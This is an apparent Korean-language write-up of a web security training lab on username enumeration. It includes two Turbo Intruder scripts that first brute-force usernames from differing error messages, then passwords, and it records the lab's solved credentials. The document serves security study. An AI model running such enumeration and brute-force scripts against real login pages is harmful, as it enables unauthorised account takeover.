#🚩Lab: Username enumeration via different responses

```text
This lab is vulnerable to username enumeration and password brute-force attacks.
It has an account with a predictable username and password, which can be found in the following wordlists:
To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.
```

### 🔍 분석 및 공격 과정
1. 임의의 username, password 쌍으로 로그인을 시도해본다.
2. `invalid username`이라고 응답에 포함되는걸 보면, 아마 username이 유효하나 비밀번호가 틀릴 경우는 에러메시지가 다를 것으로 보인다.
3. 따라서 후보 username 사전으로만 brute force를 1차적으로 진행해보고, 이후 유효한 아이디는 고정하고 패스워드를 브루트 포싱하면 될것이다.
4. 로그인 패킷을 turbo intruder로 보낸다.
5. 코드는 다음과 같이 작성하였다.
```python
import io

def queueRequests(target, wordlists):
  engine = RequestEngine(
      endpoint=target.endpoint,
      concurrentConnections=50,
      requestsPerConnection=100,
      pipeline=True,
      engine=Engine.BURP2,
  )
  with io.open(r"C:\Users\wannabb\Documents\bscp\id.txt", mode='r', encoding="utf-8") as f:
    a = [i.strip() for i in f if i.strip()]

    

  for username in a:
    engine.queue(target.req, username)


def handleResponse(req, interesting):
  table.add(req)
```
6. username이 `americas` 인경우 유일하게 답변이 `Incorrect password` 로 돌아온다.
7. 이제 username은 americas로 고정하고 비밀번호에 대해 무차별대입을 시도해본다.
```python
import io

def queueRequests(target, wordlists):
  engine = RequestEngine(
      endpoint=target.endpoint,
      concurrentConnections=50,
      requestsPerConnection=100,
      pipeline=True,
      engine=Engine.BURP2,
  )
  with io.open(r"C:\Users\fjwle\Documents\bscp\password.txt", mode='r', encoding="utf-8") as f:
    a = [i.strip() for i in f if i.strip()]

    

  for password in a:
    engine.queue(target.req, password)


def handleResponse(req, interesting):
  table.add(req)
```
8. `username=americas&password=joshua`일 경우 302코드로 리다이렉트 되며 성공적으로 로그인된다.
9. solve
                        
### 💡 취약점 원리
 BruteForce에 대한 방어가 전혀 구현되어 있지 않아, 무차별대입을 통해 유효한 아이디와 계정을 찾아냈다. 게다가 아이디가 다를 경우 응답도 차이가 있어 더 적은 요청수로 빠르게 찾아낼 수 있었음.
